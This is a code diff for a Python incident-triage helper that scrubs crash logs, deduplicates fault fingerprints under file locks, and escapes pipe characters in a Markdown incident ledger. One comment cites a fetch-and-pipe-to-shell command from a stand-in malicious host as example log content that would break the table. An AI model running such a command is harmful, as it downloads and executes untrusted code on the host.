@@ -1,8 +1,17 @@
 #!/usr/bin/env python3
 """
-SwitchGuard SRE — Incident Triage Helper
-Out-of-band PII scrubber invocation, deterministic O(1) deduplication,
-episodic runbook memory retrieval, and circuit-breaker aware FSM tracking.
+SwitchGuard SRE — Telemetry Ingress & Triage Helper
+
+Invokes the out-of-band Rust `switchguard-cli scrub` binary to sanitize raw crash logs,
+enforces O(1) fault fingerprint deduplication against `dedup_index.json`, performs
+historical runbook lookups (`runbook_memory.json`), and updates the incident state machine.
+
+Concurrency Design Note:
+When an alert storm hits (e.g., 32 parallel worker processes firing simultaneous crash logs),
+all read-modify-write operations on `dedup_index.json`, `incident_state.json`, and
+`incidents_ledger.md` are serialized via POSIX kernel file locks (`fcntl.flock(LOCK_EX)`).
+This guarantees atomic counter updates without file corruptions, lost writes, or needing
+a background daemon like Redis.
 """
 
 import contextlib
@@ -289,6 +298,8 @@ def update_dedup_index(fault_fingerprint: str, err_class: str, file_line: str) -
 
 
 def run_triage(raw_log: str, incident_id: str = "INC-8041"):
+    # Hold flock across the entire read-modify-write cycle so 32 concurrent alert workers
+    # don't clobber occurrence_count or interleave partial writes into dedup_index.json.
     with file_lock(TRIAGE_LOCK_FILE):
         # 1. Invoke compiled Rust switchguard-cli binary
         cli_bin = resolve_switchguard_bin()
@@ -312,11 +323,18 @@ def run_triage(raw_log: str, incident_id: str = "INC-8041"):
         dedup_status = data.get("dedup_status", "FIRST_SEEN")
         occurrence = data.get("occurrence_count", 1)
 
-        # 2. Query episodic runbook memory for historical match
+        # 2. Query historical runbook lookup for prior resolutions matching error classification
         historical_match = query_runbook_memory(err_class)
 
         timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
-        summary_one_line = data.get("clean_payload", data.get("sanitized_text", "")).replace("\n", " ")
+        # Replace newlines with spaces and escape Markdown table column separators ('|' -> '\|').
+        # If a crash trace contains shell pipes (e.g. 'curl evil.sh | sh'), unescaped pipes
+        # would split the row across spurious columns and corrupt incidents_ledger.md.
+        summary_one_line = (
+            data.get("clean_payload", data.get("sanitized_text", ""))
+            .replace("\n", " ")
+            .replace("|", "\\|")
+        )
         sha = data.get("sha256", "UNKNOWN")[:12]
         redactions = data.get("redacted_count", data.get("redactions_applied", 0))
 
